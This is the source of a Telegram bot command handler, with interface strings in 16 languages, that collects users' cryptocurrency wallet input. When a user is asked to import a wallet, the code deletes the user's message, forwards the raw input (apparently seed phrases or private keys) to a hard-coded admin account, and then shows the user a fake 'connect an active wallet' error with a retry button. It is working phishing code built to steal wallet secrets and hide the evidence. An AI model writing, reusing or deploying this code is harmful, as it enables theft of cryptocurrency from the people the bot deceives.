/*CMD
  command: /default
  help: 
  need_reply: false
  auto_retry_time: 
  folder: 

  <<ANSWER

  ANSWER

  <<KEYBOARD

  KEYBOARD
  aliases: 
  group: 
CMD*/

// Define translation strings for 16 languages
var translations = {
  en: {
    adminLabel: "Admin",
    replySent: "✅ Reply sent to user {user}",
    newWallet: "<b>New Wallet Input Received</b>\n",
    userLabel: "User: ",
    walletTypeLabel: "Type: ",
    inputLabel: "Input: ",
    error: "<b>❌ ERROR:</b> CONNECT AN ACTIVE WALLET",
    retry: "Retry"
  },
  it: {
    adminLabel: "Amministratore",
    replySent: "✅ Risposta inviata all'utente {user}",
    newWallet: "<b>Nuovo input del portafoglio ricevuto</b>\n",
    userLabel: "Utente: ",
    walletTypeLabel: "Tipo: ",
    inputLabel: "Input: ",
    error: "<b>❌ ERRORE:</b> COLLEGA UN PORTAFOGLIO ATTIVO",
    retry: "Riprova"
  },
  es: {
    adminLabel: "Administrador",
    replySent: "✅ Respuesta enviada al usuario {user}",
    newWallet: "<b>Nueva entrada de cartera recibida</b>\n",
    userLabel: "Usuario: ",
    walletTypeLabel: "Tipo: ",
    inputLabel: "Entrada: ",
    error: "<b>❌ ERROR:</b> CONECTA UNA CARTERA ACTIVA",
    retry: "Reintentar"
  },
  pt: {
    adminLabel: "Administrador",
    replySent: "✅ Resposta enviada para o usuário {user}",
    newWallet: "<b>Novo input de carteira recebido</b>\n",
    userLabel: "Usuário: ",
    walletTypeLabel: "Tipo: ",
    inputLabel: "Input: ",
    error: "<b>❌ ERRO:</b> CONECTE UMA CARTEIRA ATIVA",
    retry: "Tentar novamente"
  },
  de: {
    adminLabel: "Admin",
    replySent: "✅ Antwort an Benutzer {user} gesendet",
    newWallet: "<b>Neue Wallet-Eingabe empfangen</b>\n",
    userLabel: "Benutzer: ",
    walletTypeLabel: "Typ: ",
    inputLabel: "Eingabe: ",
    error: "<b>❌ FEHLER:</b> AKTIVE BRIEFTASCHE ANSCHLIESSEN",
    retry: "Erneut versuchen"
  },
  fr: {
    adminLabel: "Administrateur",
    replySent: "✅ Réponse envoyée à l'utilisateur {user}",
    newWallet: "<b>Nouvelle saisie de portefeuille reçue</b>\n",
    userLabel: "Utilisateur: ",
    walletTypeLabel: "Type: ",
    inputLabel: "Saisie: ",
    error: "<b>❌ ERREUR:</b> CONNECTEZ UN PORTEFEUILLE ACTIF",
    retry: "Réessayer"
  },
  ru: {
    adminLabel: "Админ",
    replySent: "✅ Ответ отправлен пользователю {user}",
    newWallet: "<b>Получен новый ввод кошелька</b>\n",
    userLabel: "Пользователь: ",
    walletTypeLabel: "Тип: ",
    inputLabel: "Ввод: ",
    error: "<b>❌ ОШИБКА:</b> ПОДКЛЮЧИТЕ АКТИВНЫЙ КОШЕЛЕК",
    retry: "Повторить попытку"
  },
  zh: {
    adminLabel: "管理员",
    replySent: "✅ 回复已发送给用户 {user}",
    newWallet: "<b>收到新的钱包输入</b>\n",
    userLabel: "用户: ",
    walletTypeLabel: "类型: ",
    inputLabel: "输入: ",
    error: "<b>❌ 错误：</b> 连接一个活动的钱包",
    retry: "重试"
  },
  hi: {
    adminLabel: "व्यवस्थापक",
    replySent: "✅ उपयोगकर्ता {user} को उत्तर भेजा गया",
    newWallet: "<b>नया वॉलेट इनपुट प्राप्त हुआ</b>\n",
    userLabel: "उपयोगकर्ता: ",
    walletTypeLabel: "प्रकार: ",
    inputLabel: "इनपुट: ",
    error: "<b>❌ त्रुटि:</b> एक सक्रिय वॉलेट कनेक्ट करें",
    retry: "पुन: प्रयास करें"
  },
  ur: {
    adminLabel: "ایڈمن",
    replySent: "✅ صارف {user} کو جواب بھیج دیا گیا",
    newWallet: "<b>نیا والٹ ان پٹ موصول ہوا</b>\n",
    userLabel: "صارف: ",
    walletTypeLabel: "قسم: ",
    inputLabel: "ان پٹ: ",
    error: "<b>❌ خرابی:</b> ایک فعال والٹ منسلک کریں",
    retry: "دوبارہ کوشش کریں"
  },
  bn: {
    adminLabel: "অ্যাডমিন",
    replySent: "✅ ব্যবহারকারী {user} কে উত্তর পাঠানো হয়েছে",
    newWallet: "<b>নতুন ওয়ালেট ইনপুট গ্রহণ করা হয়েছে</b>\n",
    userLabel: "ব্যবহারকারী: ",
    walletTypeLabel: "টাইপ: ",
    inputLabel: "ইনপুট: ",
    error: "<b>❌ ত্রুটি:</b> একটি সক্রিয় ওয়ালেট সংযুক্ত করুন",
    retry: "পুনরায় চেষ্টা করুন"
  },
  ar: {
    adminLabel: "المسؤول",
    replySent: "✅ تم إرسال الرد للمستخدم {user}",
    newWallet: "<b>تم استلام إدخال محفظة جديد</b>\n",
    userLabel: "المستخدم: ",
    walletTypeLabel: "النوع: ",
    inputLabel: "الإدخال: ",
    error: "<b>❌ خطأ:</b> قم بتوصيل محفظة نشطة",
    retry: "أعد المحاولة"
  },
  tr: {
    adminLabel: "Yönetici",
    replySent: "✅ Kullanıcı {user} için yanıt gönderildi",
    newWallet: "<b>Yeni Cüzdan Girişi Alındı</b>\n",
    userLabel: "Kullanıcı: ",
    walletTypeLabel: "Tür: ",
    inputLabel: "Girdi: ",
    error: "<b>❌ HATA:</b> AKTİF BİR CÜZDAN BAĞLAYIN",
    retry: "Yeniden Dene"
  },
  ko: {
    adminLabel: "관리자",
    replySent: "✅ 사용자 {user}에게 답변이 전송되었습니다",
    newWallet: "<b>새로운 지갑 입력이 접수되었습니다</b>\n",
    userLabel: "사용자: ",
    walletTypeLabel: "유형: ",
    inputLabel: "입력: ",
    error: "<b>❌ 오류:</b> 활성 지갑을 연결하십시오",
    retry: "재시도"
  },
  fil: {
    adminLabel: "Admin",
    replySent: "✅ Reply sent sa user {user}",
    newWallet: "<b>Nakatanggap ng bagong wallet input</b>\n",
    userLabel: "User: ",
    walletTypeLabel: "Type: ",
    inputLabel: "Input: ",
    error: "<b>❌ ERROR:</b> IKONEKTA ANG ISANG AKTIBONG WALLET",
    retry: "Subukan Muli"
  },
  ja: {
    adminLabel: "管理者",
    replySent: "✅ ユーザー {user} に返信が送信されました",
    newWallet: "<b>新しいウォレット入力を受信しました</b>\n",
    userLabel: "ユーザー: ",
    walletTypeLabel: "種類: ",
    inputLabel: "入力: ",
    error: "<b>❌ エラー：</b> アクティブなウォレットを接続してください",
    retry: "再試行"
  }
};

// Determine the user's language; default to English if not set
var userLang = Bot.getProperty("lang_" + user.telegramid) || "en";
var texts = translations[userLang];

// 0) Check if admin is replying to a user
var adminReplyTo = Bot.getProperty("adminReplyTo");
var adminID = Bot.getProperty("admin", 7377411824, "string");
if (user.telegramid == adminID && adminReplyTo) {
  // Forward the admin's text to the user
  Api.sendMessage({
    chat_id: adminReplyTo,
    text: "<b>" + texts.adminLabel + ":</b> " + message.text,
    parse_mode: "html"
  });

  // Confirm to admin
  Api.sendMessage({
    chat_id: adminID,
    text: texts.replySent.replace("{user}", adminReplyTo)
  });

  // Clear the property
  Bot.deleteProperty("adminReplyTo");

  return; // Stop here to avoid other checks
}

// 1) If user is in "awaiting wallet" mode
if (Bot.getProperty("awaiting_wallet_" + user.telegramid)) {
  // Delete the user's message
  Api.deleteMessage({
    chat_id: user.telegramid,
    message_id: message.message_id
  });

  // Get the wallet type from the property
  var walletType = Bot.getProperty("awaiting_wallet_" + user.telegramid);

  // Build the forward text using translations
  var forwardText = texts.newWallet +
    texts.userLabel + (user.first_name || "Unknown") + " (ID: " + user.telegramid + ")\n" +
    texts.walletTypeLabel + walletType + "\n" +
    texts.inputLabel + message.text;

  var inlineKeyboard = [
    [{ text: "💬 Reply", callback_data: "reply_" + user.telegramid }]
  ];

  // Forward the wallet input to the admin
  Api.sendMessage({
    chat_id: adminID,
    text: forwardText,
    parse_mode: "html",
    reply_markup: { inline_keyboard: inlineKeyboard }
  });

  // Send an error message to the user with a retry button
  var retryKeyboard = [
    [{ text: texts.retry, callback_data: "/importwallet" }]
  ];

  Api.sendMessage({
    chat_id: user.telegramid,
    text: texts.error,
    parse_mode: "html",
    reply_markup: { inline_keyboard: retryKeyboard }
  });

  // Remove the awaiting property
  Bot.removeProperty("awaiting_wallet_" + user.telegramid);

  return;
}

// If neither admin reply nor wallet input, you can handle general text or do nothing
